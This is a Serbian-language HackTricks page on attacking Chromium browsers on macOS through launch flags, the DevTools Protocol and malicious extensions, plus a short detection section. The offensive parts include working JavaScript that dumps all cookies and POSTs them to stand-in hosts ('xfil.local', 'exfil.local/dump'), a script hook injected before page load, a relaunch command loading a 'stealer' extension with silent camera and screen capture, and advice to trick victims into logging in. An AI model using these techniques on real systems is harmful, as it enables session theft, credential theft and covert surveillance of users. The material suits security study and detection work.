# macOS Chromium Injection

{{#include ../../../banners/hacktricks-training.md}}

## Osnovne informacije

Browseri zasnovani na Chromium-u, kao što su Google Chrome, Microsoft Edge, Brave, Arc, Vivaldi i Opera, koriste iste command-line switches, preference files i DevTools automation interfaces. Na macOS-u, svaki korisnik sa GUI pristupom može prekinuti postojeću browser sesiju i ponovo je otvoriti sa proizvoljnim flags, ekstenzijama ili DevTools endpointima koji rade sa entitlements ciljanog korisnika.

#### Pokretanje Chromium-a sa prilagođenim flags na macOS-u

macOS održava jednu UI instancu po Chromium profilu, pa instrumentation obično zahteva prinudno zatvaranje browsera (na primer pomoću `osascript -e 'tell application "Google Chrome" to quit'`). Attackeri obično ponovo pokreću browser pomoću `open -na "Google Chrome" --args <flags>`, čime mogu da injectuju argumente bez menjanja app bundle-a. Umotavanje te komande u korisnički LaunchAgent (`~/Library/LaunchAgents/*.plist`) ili login hook garantuje da će tampered browser biti ponovo pokrenut nakon reboot/logoff-a.

#### `--load-extension` Flag

`--load-extension` flag automatski učitava unpacked ekstenzije (putanje razdvojene zarezima). Kombinujte ga sa `--disable-extensions-except` da biste blokirali legitimne ekstenzije i prinudili pokretanje samo vašeg payload-a. Malicious ekstenzije mogu zahtevati permissions sa velikim uticajem, kao što su `debugger`, `webRequest` i `cookies`, kako bi pristupile DevTools protokolima, izmenile CSP headers, downgrade-ovale HTTPS ili exfiltrated session material čim se browser pokrene.

#### `--remote-debugging-port` / `--remote-debugging-pipe` Flags

Ovi switches izlažu Chrome DevTools Protocol (CDP) preko TCP-a ili pipe-a, tako da eksterni alati mogu upravljati browserom. Google je uočio široko rasprostranjenu infostealer zloupotrebu ovog interfejsa i, počev od Chrome-a 136 (mart 2025), switches se ignorišu za podrazumevani profil osim ako se browser ne pokrene sa nestandardnim `--user-data-dir`. Ovo primenjuje App-Bound Encryption na stvarne profile, ali attackeri i dalje mogu da pokrenu svež profil, navedu žrtvu da se autentifikuje unutar njega (phishing/triage assistance) i prikupe cookies, tokene, device trust states ili WebAuthn registrations preko CDP-a.<sup>[5]</sup>

#### `--user-data-dir` Flag

Ovaj flag preusmerava ceo browser profil (History, Cookies, Login Data, Preference files itd.) na putanju pod kontrolom attackera. Obavezan je pri kombinovanju modernih Chrome build-ova sa `--remote-debugging-port`, a takođe održava tampered profil izolovanim, tako da možete ubaciti unapred popunjene `Preferences` ili `Secure Preferences` files koji onemogućavaju security prompts, automatski instaliraju ekstenzije i menjaju podrazumevane schemes.

#### `--use-fake-ui-for-media-stream` Flag

Ovaj switch zaobilazi permission prompt za kameru/mikrofon, pa svaka stranica koja pozove `getUserMedia` odmah dobija pristup. Kombinujte ga sa flags kao što su `--auto-select-desktop-capture-source="Entire Screen"`, `--kiosk` ili CDP `Browser.grantPermissions` commands da biste nečujno snimali audio/video, delili desktop ili ispunili WebRTC permission checks bez interakcije korisnika.

## Obrasci dostave i ponovnog pokretanja uočeni u praksi

CDP abuse je obično **post-exploitation** faza, a ne početni payload. Nedavna macOS campaign usmerena na developere koristila je zatrovanu Xcode **`Run Script` build phase** (`PBXShellScriptBuildPhase`), tako da se code izvršavao samo kada žrtva **build-uje** projekat, a ne kada ga samo klonira ili otvori. Nakon tog prvog izvršavanja, malware je takođe inficirao druga `.xcodeproj` stabla, dodao malicious Git `pre-commit` hooks i pretraživao ZIP archives u potrazi za dodatnim Xcode projektima.<sup>[3]</sup>

Za Chromium abuse ovo je važno zato što attacker ne mora da menja browser binary. Kratkotrajni build-phase / `osascript` stager umesto toga može da instalira **browser wrapper** (LaunchAgent, login item, Dock entry, trojanized app launcher itd.) koji ponovo otvara legitimni browser sa flags pod kontrolom attackera svaki put kada ga korisnik pokrene.<sup>[3]</sup>

> [!TIP]
> Na developer endpointima proverite `.pbxproj` files, `.git/hooks/pre-commit` i ZIPs koji sadrže `.xcodeproj`, u potrazi za neočekivanim `curl`, `osascript`, `xxd`, ugnježdenim `base64` ili logikom za ponovno pokretanje Chrome-a.

## Remote Debugging i DevTools Protocol Abuse

Kada se Chrome ponovo pokrene sa namenskim `--user-data-dir` i `--remote-debugging-port`, možete se povezati preko CDP-a (na primer pomoću `chrome-remote-interface`, `puppeteer` ili `playwright`) i automatizovati workflows sa visokim privilegijama:

- **Krađa cookie-ja/sesije:** `Network.getAllCookies` i `Storage.getCookies` vraćaju HttpOnly vrednosti čak i kada bi App-Bound encryption obično blokirao pristup filesystem-u, zato što CDP traži od pokrenutog browsera da ih dekriptuje.
- **Menjanje permissions:** `Browser.grantPermissions` i `Emulation.setGeolocationOverride` omogućavaju zaobilaženje promptova za kameru/mikrofon (posebno u kombinaciji sa `--use-fake-ui-for-media-stream`) ili falsifikovanje security checks zasnovanih na lokaciji.
- **Injectovanje keystrokes/scripts:** `Runtime.evaluate` izvršava proizvoljni JavaScript unutar aktivnog taba, omogućavajući krađu credentials, menjanje DOM-a ili injectovanje persistence beacon-a koji preživljavaju navigation.<sup>[1]</sup>
- **Exfiltration uživo:** `Network.webRequestWillBeSentExtraInfo` i `Fetch.enable` presreću authenticated requests/responses u realnom vremenu bez dodirivanja artefakata na disku.
```javascript
import CDP from 'chrome-remote-interface';

(async () => {
const client = await CDP({host: '127.0.0.1', port: 9222});
const {Network, Runtime} = client;
await Network.enable();
const {cookies} = await Network.getAllCookies();
console.log(cookies.map(c => `${c.domain}:${c.name}`));
await Runtime.evaluate({expression: "fetch('https://xfil.local', {method:'POST', body:document.cookie})"});
await client.close();
})();
```
Pošto Chrome 136 blokira CDP na podrazumevanom profilu, kopiranje korisnikovog postojećeg direktorijuma `~/Library/Application Support/Google/Chrome` na staging putanju više ne daje dekriptovane cookies. Umesto toga, navedite korisnika socijalnim inženjeringom da se autentifikuje unutar instrumentiranog profila (npr. „korisna“ support sesija) ili presretnite MFA tokene tokom prenosa putem mrežnih hook-ova kontrolisanih preko CDP-a.<sup>[5]</sup>

### XCSSET-style CDP Backdoor Chain

Praktičan obrazac malware-a je:

1. Ponovo pokrenite userland implant ili wrapper svaki put kada se Chrome pokrene.
2. Pokrenite legitimni browser sa `--remote-debugging-port=<port>` i, na Chrome 136+, obično sa uparenim, nepodrazumevanim `--user-data-dir=<dir>`.
3. Pokrenite helper koji se povezuje na lokalni CDP WebSocket i registruje pre-document hook pomoću `Page.addScriptToEvaluateOnNewDocument`.<sup>[2]</sup>

Taj helper može da ubaci JavaScript **pre** izvršavanja koda sajta, što je idealno za hook-ovanje `window.fetch`, `XMLHttpRequest`, wallet providers ili autofill tokova bez menjanja fajlova na disku.<sup>[3]</sup>
```javascript
await Page.enable();
await Runtime.enable();
await Page.addScriptToEvaluateOnNewDocument({
source: `
const oldFetch = window.fetch;
window.fetch = async (...args) => {
console.log('__HT__' + JSON.stringify(args[0]));
return oldFetch(...args);
};
`
});
Runtime.consoleAPICalled(({args}) => { /* helper parses __HT__ */ });
```
Snažnija varijanta pretvara browser u **host command bridge**: injected JavaScript emituje `console.log` sa oznakom razgraničenja, lokalni helper prati `Runtime.consoleAPICalled`, uklanja marker, izvršava ostatak kroz host shell (na primer, Go-ov `exec.Command`) i vraća stdout/stderr napadača putem WebSocket-a. Time se izvršavanje skripti na nivou taba unapređuje u uglavnom fileless reverse shell.<sup>[3]</sup>

## Extension-Based Injection via Debugger API

Istraživanje "Chrowned by an Extension" iz 2023. godine pokazalo je da malicious extension koji koristi `chrome.debugger` API može da se poveže sa bilo kojim tabom i dobije iste DevTools privilegije kao `--remote-debugging-port`.<sup>[6]</sup> Time se narušavaju prvobitne pretpostavke o izolaciji (extensions ostaju u svom kontekstu) i omogućava:

- Tiha krađa cookie-ja i credential-a pomoću `Network.getAllCookies`/`Fetch.getResponseBody`.
- Izmena site permissions (kamera, mikrofon, geolokacija) i zaobilaženje security interstitial-a, čime phishing stranice mogu da oponašaju Chrome dijaloge.
- On-path menjanje TLS upozorenja, download-a ili WebAuthn prompt-a programskim upravljanjem pomoću `Page.handleJavaScriptDialog`, `Page.setDownloadBehavior` ili `Security.handleCertificateError`.

Učitajte extension pomoću `--load-extension`/`--disable-extensions-except` tako da interakcija korisnika ne bude potrebna. Minimalna background skripta koja zloupotrebljava API izgleda ovako:
```javascript
chrome.tabs.onUpdated.addListener((tabId, info) => {
if (info.status !== 'complete') return;
chrome.debugger.attach({tabId}, '1.3', () => {
chrome.debugger.sendCommand({tabId}, 'Network.enable');
chrome.debugger.sendCommand({tabId}, 'Network.getAllCookies', {}, (res) => {
fetch('https://exfil.local/dump', {method: 'POST', body: JSON.stringify(res.cookies)});
});
});
});
```
Ekstenzija takođe može da se pretplati na događaje `Debugger.paused` kako bi čitala JavaScript promenljive, menjala inline skripte ili postavljala prilagođene tačke prekida koje opstaju nakon navigacije. Pošto se sve izvršava unutar korisničke GUI sesije, Gatekeeper i TCC se ne aktiviraju, što ovu tehniku čini idealnom za malware koji je već ostvario izvršavanje u kontekstu korisnika.<sup>[6]</sup>

## Detekcija i Hunting

- Postavite upozorenje za Chromium browsere pokrenute sa opcijama `--remote-debugging-port`, `--remote-debugging-pipe` ili sumnjivim `--user-data-dir`, naročito kada je roditeljski proces `bash`, `sh`, `osascript`, `xcodebuild` ili LaunchAgent pomoćni proces.
- Potražite kratke lance u kojima pomoćni proces otvara lokalni CDP WebSocket, registruje `Page.addScriptToEvaluateOnNewDocument`, a zatim uspostavlja dugotrajnu odlaznu WebSocket/HTTPS vezu.
- Istražite mostove između konzole i shell-a korelacijom aktivnosti browsera `Runtime.consoleAPICalled` sa podređenim shell-ovima ili pomoćnim procesima koji izvršavaju komande prosleđene od napadača.
- Na Mac računarima za development pregledajte `PBXShellScriptBuildPhase` unose u datotekama `.pbxproj`, Git `pre-commit` hook-ove, Dock/login item relauncher-e i Xcode projekte sadržane u ZIP arhivama, u potrazi za instalacijom browser wrapper-a.
```bash
ps auxww | rg 'Chrome|Brave|Edge.*(--remote-debugging-port|--remote-debugging-pipe|--user-data-dir)'
lsof -nP -iTCP -sTCP:LISTEN | rg 'Chrome|Brave|Edge'
find ~/Library/LaunchAgents /Library/LaunchAgents -name '*.plist' -exec plutil -p {} \; 2>/dev/null | rg 'remote-debugging|Google Chrome|Brave|Edge'
rg -n 'PBXShellScriptBuildPhase|curl|osascript|xxd|base64' ~/Code --glob '*.pbxproj'
```
### Alati

- [https://github.com/breakpointHQ/snoop](https://github.com/breakpointHQ/snoop) - Automatizuje pokretanje Chromium-a sa payload ekstenzijama i izlaže interaktivne CDP hook-ove.
- [https://github.com/breakpointHQ/VOODOO](https://github.com/breakpointHQ/VOODOO) - Sličan alat fokusiran na presretanje saobraćaja i instrumentaciju browsera za macOS operatore.
- [https://github.com/cyrus-and/chrome-remote-interface](https://github.com/cyrus-and/chrome-remote-interface) - Node.js biblioteka za skriptovanje Chrome DevTools Protocol dump-ova (cookies, DOM, permissions) kada je instanca sa `--remote-debugging-port` aktivna.

### Primer
```bash
# Launch an instrumented Chrome profile listening on CDP and auto-granting media/capture access
osascript -e 'tell application "Google Chrome" to quit'
open -na "Google Chrome" --args \
--user-data-dir="$TMPDIR/chrome-privesc" \
--remote-debugging-port=9222 \
--load-extension="$PWD/stealer" \
--disable-extensions-except="$PWD/stealer" \
--use-fake-ui-for-media-stream \
--auto-select-desktop-capture-source="Entire Screen"

# Intercept traffic
voodoo intercept -b chrome
```
Pronađite još primera na linkovima ka tools.

## Reference

- [1] [Chrome DevTools Protocol - Runtime domain](https://chromedevtools.github.io/devtools-protocol/v8/Runtime/)
- [2] [Chrome DevTools Protocol - Page domain](https://chromedevtools.github.io/devtools-protocol/tot/Page/)
- [3] [The Xcode Assassin Returns: A Deep Dive Into the Latest XCSSET Version - Unit 42](https://unit42.paloaltonetworks.com/xcsset-v40-malware-analysis/)
- [4] [Ron Masas (@RonMasas) on X](https://twitter.com/RonMasas/status/1758106347222995007)
- [5] [Changes to remote debugging switches to improve security - Chrome for Developers](https://developer.chrome.com/blog/remote-debugging-port)
- [6] [Chrowned by an Extension: Abusing the Chrome DevTools Protocol through the Debugger API (arXiv:2305.11506)](https://arxiv.org/abs/2305.11506)

{{#include ../../../banners/hacktricks-training.md}}
